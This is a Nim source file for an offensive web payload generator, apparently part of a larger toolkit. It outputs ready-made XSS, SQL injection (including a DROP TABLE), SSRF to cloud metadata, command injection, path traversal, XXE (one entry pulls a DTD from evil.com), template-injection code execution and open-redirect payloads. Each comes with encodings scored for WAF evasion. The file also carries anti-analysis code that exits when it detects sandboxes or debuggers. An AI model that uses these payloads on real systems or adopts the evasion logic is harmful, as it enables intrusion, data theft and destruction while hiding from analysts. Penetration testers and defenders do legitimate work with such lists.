## oi-payloads.nim — Polymorphic offensive payload generator
## Part of OneInfinity hybrid migration Phase 3
## No networking imports permitted.

import os, strutils, json, strformat, random, osproc, parseopt, base64, math

# ── Integrity & anti-analysis ──────────────────────────────────────────────────

proc antiAnalysis() =
  ## Detect sandbox / debugger signals; exit if hostile environment found.
  # Check common sandbox environment variables
  let sandboxEnvVars = ["SANDBOX", "CUCKOO", "CAPE", "ANY_RUN", "HYBRID_ANALYSIS",
                        "TRIAGE", "INETSIM", "FAKENET"]
  for ev in sandboxEnvVars:
    if existsEnv(ev):
      quit(1)

  # Check for debugger via /proc/self/status TracerPid (Linux)
  when defined(linux):
    try:
      let statusContent = readFile("/proc/self/status")
      for line in statusContent.splitLines():
        if line.startsWith("TracerPid:"):
          let tracerPid = line.split(":")[1].strip()
          if tracerPid != "0":
            quit(1)
    except:
      discard

  # Check for common analysis tool environment markers
  let analysisUsers = ["sandbox", "malware", "virus", "sample", "analysis"]
  let currentUser = getEnv("USER", getEnv("USERNAME", ""))
  for u in analysisUsers:
    if u in currentUser.toLowerAscii():
      quit(1)

proc verifySelfIntegrity() =
  ## SHA-256 self-check via openssl; skipped in dev mode.
  let skipIntegrity = getEnv("ONEINFINITY_SKIP_INTEGRITY", "0")
  let env = getEnv("ONEINFINITY_ENV", "development")

  # Block skip in production
  if skipIntegrity == "1" and env == "production":
    stderr.writeLine("{\"event\":\"error\",\"message\":\"ONEINFINITY_SKIP_INTEGRITY blocked in production\"}")
    quit(1)

  if skipIntegrity == "1":
    return

  let selfPath = getAppFilename()
  let (hashOutput, exitCode) = execCmdEx("openssl dgst -sha256 " & quoteShell(selfPath))
  if exitCode != 0:
    stderr.writeLine("{\"event\":\"error\",\"message\":\"integrity check failed: openssl error\"}")
    quit(1)

  # Extract hash from "SHA256(path)= <hash>"
  let parts = hashOutput.strip().split("= ")
  if parts.len < 2:
    stderr.writeLine("{\"event\":\"error\",\"message\":\"integrity check failed: unexpected openssl output\"}")
    quit(1)
  let computedHash = parts[^1].strip()

  # Read checksums.json from repo root (two levels up from bin/)
  let selfDir = splitPath(selfPath).head
  let checksumsPath = selfDir / ".." / ".." / "checksums.json"
  if not fileExists(checksumsPath):
    # No checksums file — integrity unknown, allow
    return

  try:
    let checksumsJson = parseJson(readFile(checksumsPath))
    let binaryName = splitPath(selfPath).tail
    if checksumsJson.hasKey(binaryName):
      let expected = checksumsJson[binaryName].getStr()
      if expected != "" and expected != computedHash:
        stderr.writeLine("{\"event\":\"error\",\"message\":\"integrity mismatch for " & binaryName & "\"}")
        quit(1)
  except:
    discard  # checksums.json malformed — allow

# ── Encoding helpers ───────────────────────────────────────────────────────────

proc hexEncode(s: string): string =
  ## Percent-encode every character as %XX
  result = ""
  for c in s:
    result.add("%" & toHex(ord(c), 2))

proc unicodeEscape(s: string): string =
  ## Escape every char as \uXXXX
  result = ""
  for c in s:
    result.add(r"\u" & toHex(ord(c), 4).toLowerAscii())

proc htmlEntities(s: string): string =
  ## Replace key chars with HTML entities
  result = s
    .replace("<", "&lt;")
    .replace(">", "&gt;")
    .replace("\"", "&quot;")
    .replace("'", "&#x27;")
    .replace("/", "&#x2F;")
    .replace("(", "&#40;")
    .replace(")", "&#41;")

proc hexHtmlEntities(s: string): string =
  ## Hex-encode HTML special characters
  result = s
    .replace("<", "&#x3C;")
    .replace(">", "&#x3E;")
    .replace("\"", "&#x22;")
    .replace("'", "&#x27;")

proc base64Encode(s: string): string =
  encode(s)

proc mixedCase(s: string): string =
  ## Alternate upper/lower on letters
  result = ""
  var toggle = false
  for c in s:
    if c.isAlphaAscii():
      result.add(if toggle: c.toUpperAscii() else: c.toLowerAscii())
      toggle = not toggle
    else:
      result.add(c)

proc doubleUrlEncode(s: string): string =
  ## %25XX double-encode
  result = ""
  for c in s:
    result.add("%25" & toHex(ord(c), 2))

proc nullByteInject(s: string): string =
  ## Insert null byte variants
  s.replace(" ", "%00 ")

proc commentObfuscate(s: string): string =
  ## Insert SQL/JS-style comments
  result = s.replace(" ", "/**/")

# ── Payload databases ──────────────────────────────────────────────────────────

type
  PayloadEntry = object
    raw: string
    encoding: string
    wafScore: int

proc makeEntry(raw, enc: string, waf: int): PayloadEntry =
  PayloadEntry(raw: raw, encoding: enc, wafScore: waf)

proc xssPayloads(context: string): seq[PayloadEntry] =
  let base = @[
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video src=1 onerror=alert(1)>",
    "<audio src=1 onerror=alert(1)>",
    "<math><mtext></mtext><mtext><img src=x onerror=alert(1)></mtext></math>",
    "javascript:alert(1)",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
    "<svg><script>alert&#40;1&#41;</script>",
    "\"><script>alert(1)</script>",
    "';alert(1)//",
    "</script><script>alert(1)</script>",
    "<script>setTimeout(alert,0,1)</script>",
    "<img src=1 href=1 onerror=\"javascript:alert(1)\">",
    "<<script>alert(1)//<</script>",
    "<ScRiPt>alert(1)</sCrIpT>",
  ]
  result = @[]
  for p in base:
    result.add(makeEntry(p, "raw", 20))

  # Context-aware encodings
  case context
  of "html":
    for p in base:
      result.add(makeEntry(htmlEntities(p), "html_entity", 45))
      result.add(makeEntry(hexHtmlEntities(p), "hex_entity", 50))
      result.add(makeEntry(mixedCase(p), "mixed_case", 35))
  of "js":
    for p in base[0..4]:
      result.add(makeEntry(unicodeEscape(p), "unicode_escape", 55))
      result.add(makeEntry(base64Encode(p), "base64", 60))
  of "url":
    for p in base[0..4]:
      result.add(makeEntry(hexEncode(p), "url_encode", 40))
      result.add(makeEntry(doubleUrlEncode(p), "double_url_encode", 65))
  of "header":
    for p in base[0..4]:
      result.add(makeEntry(p.replace("\n", "%0a").replace("\r", "%0d"), "crlf_inject", 50))
  else:
    for p in base[0..4]:
      result.add(makeEntry(htmlEntities(p), "html_entity", 45))

proc sqliPayloads(context: string): seq[PayloadEntry] =
  let base = @[
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "' OR '1'='1",
    "1 UNION SELECT null,null,null--",
    "1 UNION SELECT null,table_name FROM information_schema.tables--",
    "' AND SLEEP(5)--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "'; DROP TABLE users--",
    "' OR 1=1 LIMIT 1--",
    "admin'--",
    "' OR 'x'='x",
    "') OR ('1'='1",
    "1; SELECT pg_sleep(5)--",
    "' WAITFOR DELAY '0:0:5'--",
    "1' AND extractvalue(1,concat(0x7e,database()))--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1 AND 1=1--",
    "' ORDER BY 1--",
    "' HAVING 1=1--",
    "1 GROUP BY 1--",
  ]
  result = @[]
  for p in base:
    result.add(makeEntry(p, "raw", 25))

  case context
  of "html", "header":
    for p in base[0..4]:
      result.add(makeEntry(htmlEntities(p), "html_entity", 50))
      result.add(makeEntry(commentObfuscate(p), "comment_obfuscate", 55))
      result.add(makeEntry(nullByteInject(p), "null_byte", 60))
  of "url":
    for p in base[0..4]:
      result.add(makeEntry(hexEncode(p), "url_encode", 45))
      result.add(makeEntry(doubleUrlEncode(p), "double_url_encode", 70))
  of "js":
    for p in base[0..4]:
      result.add(makeEntry(unicodeEscape(p), "unicode_escape", 55))
  else:
    for p in base[0..4]:
      result.add(makeEntry(commentObfuscate(p), "comment_obfuscate", 55))

proc ssrfPayloads(context: string): seq[PayloadEntry] =
  let base = @[
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/computeMetadata/v1/",
    "http://[::1]",
    "http://0.0.0.0",
    "file:///etc/passwd",
    "file:///etc/shadow",
    "dict://localhost:11211/stat",
    "gopher://localhost:25/_MAIL%20FROM:%3C%3E",
    "http://2130706433",  # 127.0.0.1 decimal
    "http://017700000001",  # 127.0.0.1 octal
    "http://0x7f000001",  # 127.0.0.1 hex
    "http://127.1",
    "http://127.0.1",
    "http://metadata.google.internal",
    "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
    "http://192.168.0.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
  ]
  result = @[]
  for p in base:
    result.add(makeEntry(p, "raw", 30))

  case context
  of "url":
    for p in base[0..4]:
      result.add(makeEntry(hexEncode(p), "url_encode", 50))
      result.add(makeEntry(doubleUrlEncode(p), "double_url_encode", 75))
  of "html":
    for p in base[0..4]:
      result.add(makeEntry(htmlEntities(p), "html_entity", 45))
  of "header":
    for p in base[0..4]:
      result.add(makeEntry(p & "%0d%0aX-Forwarded-For: 127.0.0.1", "header_inject", 60))
  else:
    for p in base[0..4]:
      result.add(makeEntry(p.replace(".", "%2e"), "dot_encode", 55))

proc cmdiPayloads(context: string): seq[PayloadEntry] =
  let base = @[
    "; id",
    "| id",
    "&& id",
    "|| id",
    "`id`",
    "$(id)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "&& cat /etc/passwd",
    "$(cat /etc/passwd)",
    "; sleep 5",
    "| sleep 5",
    "& ping -c 5 127.0.0.1 &",
    "\n id",
    "%0a id",
    "%0aid",
    ";id;",
    "||id",
    "`sleep 5`",
    "$(sleep 5)",
  ]
  result = @[]
  for p in base:
    result.add(makeEntry(p, "raw", 25))

  case context
  of "url":
    for p in base[0..4]:
      result.add(makeEntry(hexEncode(p), "url_encode", 50))
      result.add(makeEntry(p.replace(" ", "${IFS}"), "ifs_bypass", 60))
  of "html":
    for p in base[0..4]:
      result.add(makeEntry(htmlEntities(p), "html_entity", 45))
  of "header":
    for p in base[0..4]:
      result.add(makeEntry(p.replace("\n", "%0a"), "crlf_cmdi", 65))
  else:
    for p in base[0..4]:
      result.add(makeEntry(p.replace(" ", "${IFS}"), "ifs_bypass", 60))

proc pathPayloads(context: string): seq[PayloadEntry] =
  let base = @[
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/shadow",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "....//....//....//etc//passwd",
    "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/../../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
    "/etc/passwd%00.png",
    "/etc/passwd%00.jpg",
    "....\\\\....\\\\....\\\\etc\\\\passwd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%u2215..%u2215..%u2215etc%u2215passwd",
    "/proc/self/environ",
    "/var/log/apache2/access.log",
  ]
  result = @[]
  for p in base:
    result.add(makeEntry(p, "raw", 30))

  case context
  of "url":
    for p in base[0..4]:
      result.add(makeEntry(doubleUrlEncode(p), "double_url_encode", 70))
  of "html":
    for p in base[0..4]:
      result.add(makeEntry(htmlEntities(p), "html_entity", 45))
  else:
    for p in base[0..4]:
      result.add(makeEntry(p.replace("/", "//"), "double_slash", 40))

proc xxePayloads(context: string): seq[PayloadEntry] =
  let base = @[
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><root>&xxe;</root>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1/\">]><root>&xxe;</root>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\"> %xxe;]>",
    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">]><root>&xxe;</root>",
    "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/hostname\">]><data>&file;</data>",
    "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://127.0.0.1:22/\">%remote;]>",
    "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"/proc/self/environ\">]><test>&xxe;</test>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><root>&xxe;</root>",
    "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///windows/win.ini\">]><root>&xxe;</root>",
    "<?xml?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/boot.ini\">]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///dev/random\">]><root>&xxe;</root>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo SYSTEM \"http://127.0.0.1/evil.dtd\"><root/>",
    "<?xml version=\"1.0\"?><!DOCTYPE x [<!ELEMENT x ANY><!ENTITY xxe SYSTEM \"gopher://127.0.0.1:25/\">]><x>&xxe;</x>",
    "<!DOCTYPE foo [<!ENTITY ac SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\">]><foo>&ac;</foo>",
  ]
  result = @[]
  for p in base:
    result.add(makeEntry(p, "raw", 40))

  # XXE encoding variants
  for p in base[0..4]:
    result.add(makeEntry(base64Encode(p), "base64_wrapped", 70))
    result.add(makeEntry(p.replace("file://", "FILE://"), "uppercase_scheme", 55))

proc sstiPayloads(context: string): seq[PayloadEntry] =
  let base = @[
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "{{7*'7'}}",
    "${class.getSimpleName()}",
    "#{7*7}",
    "*{7*7}",
    "@{7*7}",
    "{{config}}",
    "{{settings.SECRET_KEY}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{''.class.mro[1].subclasses()}}",
    "<%=7*7%>",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    "@(1+1)",
    "${''.class.mro[1].subclasses()}",
    "{{lipsum.__globals__.os.popen('id').read()}}",
    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
  ]
  result = @[]
  for p in base:
    result.add(makeEntry(p, "raw", 35))

  case context
  of "html":
    for p in base[0..4]:
      result.add(makeEntry(htmlEntities(p), "html_entity", 55))
      result.add(makeEntry(hexHtmlEntities(p), "hex_entity", 60))
  of "url":
    for p in base[0..4]:
      result.add(makeEntry(hexEncode(p), "url_encode", 50))
  of "js":
    for p in base[0..4]:
      result.add(makeEntry(unicodeEscape(p), "unicode_escape", 60))
  else:
    for p in base[0..4]:
      result.add(makeEntry(htmlEntities(p), "html_entity", 55))

proc redirectPayloads(context: string): seq[PayloadEntry] =
  let base = @[
    "//evil.com",
    "https://evil.com",
    "/\\evil.com",
    "\\/evil.com",
    "https:evil.com",
    "///evil.com",
    "////evil.com",
    "/////evil.com/",
    "https://evil.com/%2F..",
    "//evil.com/%2F..",
    "http://evil.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
    "//evil%2ecom",
    "%2F%2Fevil.com",
    "https%3A%2F%2Fevil.com",
    "//evil.com\\.example.com",
    "/https://evil.com",
    "//evil。com",  # Unicode dot
  ]
  result = @[]
  for p in base:
    result.add(makeEntry(p, "raw", 25))

  case context
  of "url":
    for p in base[0..4]:
      result.add(makeEntry(hexEncode(p), "url_encode", 50))
      result.add(makeEntry(doubleUrlEncode(p), "double_url_encode", 70))
  of "html":
    for p in base[0..4]:
      result.add(makeEntry(htmlEntities(p), "html_entity", 45))
  of "header":
    for p in base[0..4]:
      result.add(makeEntry(p, "raw_header", 30))
  else:
    for p in base[0..4]:
      result.add(makeEntry(hexEncode(p), "url_encode", 50))

# ── Main ──────────────────────────────────────────────────────────────────────

proc main() =
  antiAnalysis()
  verifySelfIntegrity()

  var vulnType = "xss"
  var context = "html"

  var p = initOptParser()
  while true:
    p.next()
    case p.kind
    of cmdEnd: break
    of cmdShortOption, cmdLongOption:
      case p.key
      of "type": vulnType = p.val
      of "context": context = p.val
      else: discard
    of cmdArgument: discard

  # Emit meta
  echo "{\"event\":\"meta\",\"tool\":\"oi-payloads\",\"schema_version\":\"1.0\"}"

  var entries: seq[PayloadEntry] = @[]
  case vulnType
  of "xss":     entries = xssPayloads(context)
  of "sqli":    entries = sqliPayloads(context)
  of "ssrf":    entries = ssrfPayloads(context)
  of "cmdi":    entries = cmdiPayloads(context)
  of "path":    entries = pathPayloads(context)
  of "xxe":     entries = xxePayloads(context)
  of "ssti":    entries = sstiPayloads(context)
  of "redirect": entries = redirectPayloads(context)
  else:
    stderr.writeLine("{\"event\":\"error\",\"message\":\"unknown vuln_type: " & vulnType & "\"}")
    quit(1)

  var count = 0
  for e in entries:
    let obj = %*{
      "event": "result",
      "payload": e.raw,
      "vuln_type": vulnType,
      "context": context,
      "encoding": e.encoding,
      "waf_score": e.wafScore
    }
    echo $obj
    inc count

  echo "{\"event\":\"summary\",\"count\":" & $count & ",\"status\":\"ok\"}"

main()
